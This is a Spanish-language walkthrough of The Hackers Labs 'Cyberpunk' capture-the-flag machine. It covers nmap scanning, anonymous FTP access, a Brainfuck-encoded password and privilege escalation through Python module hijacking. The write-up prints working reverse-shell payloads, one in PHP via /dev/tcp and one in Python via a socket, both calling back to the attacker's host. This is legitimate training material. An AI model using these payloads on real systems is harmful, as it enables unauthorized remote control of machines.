---
title: "thehackerslabs.com: máquina Cyberpunk"
published: true
date: 2024-05-06 18:10:00
tags: [Reverse Shell, Python Privilege Escalation, FTP Enumeration, Anonymous FTP Login, Nmap Scan, Netcat Listener, Directory Traversal, Privilege Escalation]
image: /blog/assets/thehackerslabs.com_cyberpunk/portada.png
---


<br>
![](/blog/assets/thehackerslabs.com_cyberpunk/portada.png)
<br>


### Descripción
* * *
<br>
Aquí veremos cómo logramos vulnerar la máquina "Cyberpunk" de The Hackers Labs. Esta máquina nos pone a prueba con una combinación interesante de vulnerabilidades y nos exige usar varias técnicas para llegar al acceso root. Se verán conceptos de programación, y codificaciones un tanto peculiar para obtener accesos máximos a esta máquina


### Enlace de Lab:
[thehackerslabs: Cyberpunk](https://thehackerslabs.com/cyberpunk/).


### Dificultad:
Fácil.






### Solución
* * *
<br>


Para iniciar el proceso de `vulnerar` esta máquina, lo primero que haremos es con ayuda de `nmap` ver a qué nos estamos enfrentando.


``` shell
nmap -p- -Pn  -sS --min-rate 5000 --open 192.168.1.127  -oX report.xml -v
```
donde:


`-p-`: Escanea todos los puertos existentes (0-65365)


`-Pn`: Evita que `nmap` realice un descubrimiento de host antes de realizar el escaneo


`-sS`: Realiza un escaneo de puertos TCP mediante un escaneo SYN. Esto implica enviar un paquete SYN y esperar una respuesta; si el puerto está abierto, el host responderá con un paquete SYN-ACK


`--min-rate`: Configura la tasa mínima de paquetes enviados a 5000 paquetes por segundo. Esto acelera el escaneo, ya que `nmap` enviará paquetes a una tasa muy alta


`--open`: Esta opción le indica a `nmap` que sólo muestre los puertos que están abiertos.


`-oX`: Guarda la salida del escaneo en un archivo XML llamado `report.xml`


`-v`: Aumenta la verbosidad de la salida de `nmap`, proporcionando más detalles sobre lo que está haciendo `nmap`.


<br>
![](/blog/assets/thehackerslabs.com_cyberpunk/paso_1.JPG)
<br>


Obtenemos 2 puertos abiertos,  `22 -> ssh` y `80 -> http`  .


Ahora es momento de ver con qué versiones nos estamos enfrentando de cada servicio. Para ello implementamos el código:


```shell
nmap -sCV -p222,80 192.168.1.127 -oN ports_version
```


Donde:


**`-sC`**Esta opción le dice a `nmap` que ejecute scripts predeterminados contra los puertos encontrados.
  
**`-sV`**: Le indica a `nmap` que intente determinar la versión de los servicios que se están ejecutando en los puertos abiertos.


>*sCV es la combinación de ambos comandos*.




![](/blog/assets/thehackerslabs.com_cyberpunk/paso_2.JPG)


Nos fijamos que tiene varios puertos vulnerables.


`puerto 21`: servicio FTP


`puerto 22`: servicio SSH


`puerto 80`: servicio http




Lo primero que haremos es ver los vectores de entrada que tiene el `puerto 21`, vemos que podemos hacer login de forma anónima, para ello ejecutamos:


```shell
ftp 192.168.1.127
```


Cuando nos pida `usuario` escribimos `anonymous` y el campo `password` lo dejamos en blanco


<br>
![](/blog/assets/thehackerslabs.com_cyberpunk/paso_3.JPG)
<br>


Una vez dentro, nos encontramos con varios archivos, el más interesante, es `secret.txt`. Lo descargamos con `get` y vemos que tiene el siguiente contenido:


```text
*********************************************
*                                           *
*        Hola Netrunner,                   *
*                                           *
*   Has sido contratado por el mejor fixer  *
*   de la ciudad para llevar a cabo una     *
*   misión crucial.                         *
*                                           *
*   Tenemos información de que Arasaka,     *
*   la mega-corporación más poderosa de     *
*   Night City, está migrando sus sistemas  *
*   y actualmente parece ser vulnerable.    *
*   Necesitamos que te infiltres en sus    *
*   sistemas y desactives el Relic para     *
*   salvar la vida de V.                    *
*                                           *
*   Te espero en Apache.                    *
*                                           *
*                         - Alt             *
*********************************************


```


A diferencia, de lo que especificaba el nombre, no nos da ninguna información tan relevante, a parte de decirnos que están migrando y que hay una vulnerabilidad.




Fijándonos en el directorio `ftp`, nos fijamos que podemos subir archivos, así que lo que haremos es crear una `reverse shell` en `php` para acceder mediante el navegador.


Para crear la `reverse shell`, lo hacemos con el siguiente código:


```php
<?php
exec("/bin/bash -c 'bash -i >& /dev/tcp/192.168.1.119/443 0>&1'");
```


lo subimos con el comando `put`


<br>
![](/blog/assets/thehackerslabs.com_cyberpunk/paso_4.JPG)
<br>




Abrimos una nueva terminal para usarlo como puerto de escucha, en el cual ejecutaremos la siguiente instrucción:


```ssh
nc -lnvp 443
```


<br>
![](/blog/assets/thehackerslabs.com_cyberpunk/paso_5.JPG)
<br>


Ahora, mediante la web accedemos al archivo `php` que habíamos subido mediante el servicio `ftp`




<br>
![](/blog/assets/thehackerslabs.com_cyberpunk/paso_6.JPG)
<br>


Vamos a la terminal que teníamos de escucha y nos debería permitir poder ejecutar codigos en el servidor


<br>
![](/blog/assets/thehackerslabs.com_cyberpunk/paso_7.JPG)
<br>


Navegamos entre las carpetas más comunes del sistema que pudiesen tener información relevante, y encontramos algo en `/opt` con el nombre de `arasaka.txt`. El cual cuenta con el siguiente contenido:


```text
++++++++++[>++++++++++>++++++++++++>++++++++++>++++++++++>+++++++++++>+++++++++++>++++++++++++>+++++++++++>+++++++++++>+++++>+++++>++++++<<<<<<<<<<<<-]>-.>+.>--.>+.>++++.>++.>---.>.>---.>.>--.>-----..
```


Esto lo pasamos a un traductor de `brainfuck to ascii` y nos debería dar una palabra, la cual aparenta ser la `clave`.


Intentamos con el usuario arasaka y la clave que `decodificamos` del `brainfuck` y vemos que efectivamente, tenemos acceso.


<br>
![](/blog/assets/thehackerslabs.com_cyberpunk/paso_9.JPG)
<br>




Y si hacemos un `ls` nos percatamos de que ya tenemos acceso a la `flag` de usuario.


<br>
![](/blog/assets/thehackerslabs.com_cyberpunk/flag.JPG)
<br>


Es momento de buscar una forma de `escalar privilegios` y poder llegar a `root`. Para ello, ejecutamos la siguiente instrucción


```shell
sudo -l
```


<br>
![](/blog/assets/thehackerslabs.com_cyberpunk/paso_10.JPG)
<br>


`randombase64.py`
```python
import base64
message = input("Enter your string")
message_bytes = message.encode("ascii")
base64_bytes = base64.b64encode(message_bytes)
base64_message = base64_bytes.decode("ascii")


print(base64_message)




```
Vemos que podemos ejecutar como usuario `root` un `script Python`, el cual ingresas un texto y lo traduce a `base64`




Viendo su `código fuente` podemos determinar que es posible hacer una `reverse shell` en `Python` y pasarla, esto porque el script `randombase64.py` en su primera línea hace un `import base64`




Creamos un script python llamado `base64.py` con la siguiente instrucción:


```python
import socket,subprocess,os
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("192.168.1.119",443))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"]);
```


Abrimos una terminal con `nc` en escucha por el `puerto 443`


<br>
![](/blog/assets/thehackerslabs.com_cyberpunk/paso_11.JPG)
<br>


Del lado del servidor ejecutamos la instrucción


```shell
sudo /usr/bin/python3.11 /home/arasaka/randombase64.py
```


Y en nuestra terminal de escucha, tendremos el acceso `root` así como acceso a la `flag` para terminar el reto.


<br>
![](/blog/assets/thehackerslabs.com_cyberpunk/paso_12.JPG)
<br>


Y así es como obtenemos `root`.









